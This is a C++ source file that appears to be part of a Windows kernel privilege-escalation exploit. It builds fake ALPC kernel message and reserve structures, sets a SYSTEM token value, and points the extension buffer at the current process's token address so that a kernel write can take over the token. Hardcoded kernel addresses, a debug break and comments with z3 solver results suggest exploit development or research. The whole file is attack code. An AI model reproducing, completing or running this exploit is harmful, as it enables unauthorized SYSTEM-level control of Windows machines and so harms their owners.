#include "common.h"

__inline void * ULongLongToPtr64( const unsigned long long ull )
{
    return( (void *)(ULONG_PTR)ull );
}
/*!
	\brief Initialize fake kernel _KALPC_MESSAGE & _KALPC_RESERVE structure fields.
*/
void InitFakeStructs()
{
	HANDLE hProcHeap = GetProcessHeap();
	//kd> ?? sizeof(nt!_KALPC_MESSAGE) unsigned int64 0x118
	auto fake_message = (_KALPC_MESSAGE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, (sizeof(_KALPC_MESSAGE)));
	//kd> ?? sizeof(nt!_KALPC_RESERVE) unsigned int64 0x30
	auto fake_reserve = (_KALPC_RESERVE*)HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, (sizeof(_KALPC_RESERVE)));
	auto DataUserVa = HeapAlloc(hProcHeap, HEAP_ZERO_MEMORY, 0x1000);
	/* 
	Multiple valid results from z3

	[DataLength = 32,
	ExtensionBufferSize = 8,
	Size = 64,
	MessageBufferSize = 24]
	 
	[ExtensionBufferSize = 8,
	MessageBufferSize = 0,
	Size = 40,
	DataLength = 8] 
	*/
	// Should be a System token value
	*((__int64*)DataUserVa) = 0xffff9208caa3508e;

	// Initialize structures
	fake_message->DataUserVa = DataUserVa;
	// Set AlpcMsg->Reserve field
	fake_message->Reserve = fake_reserve;
	fake_reserve->Message = fake_message;
	// Set Reserve->Size field
	fake_reserve->Size = 40;
	// Set AlpcMsg->PortMessage.u1.s1.DataLength field
	fake_message->PortMessage.u1.s1.DataLength = 8;
	// Set AlpcMsg->ExtensionBufferSize
	fake_message->ExtensionBufferSize = 8;
	// Set AlpcMsg->ExtensionBuffer, this is our current process Token kernel address
	auto CurrentTokenAddr = ULongLongToPtr64(0xffffa90529a1b538);
	fake_message->ExtensionBuffer = CurrentTokenAddr;
	__debugbreak();
	printf("fake_message address: 0x%p\n", fake_message);
	
	CloseHandle(hProcHeap);
}
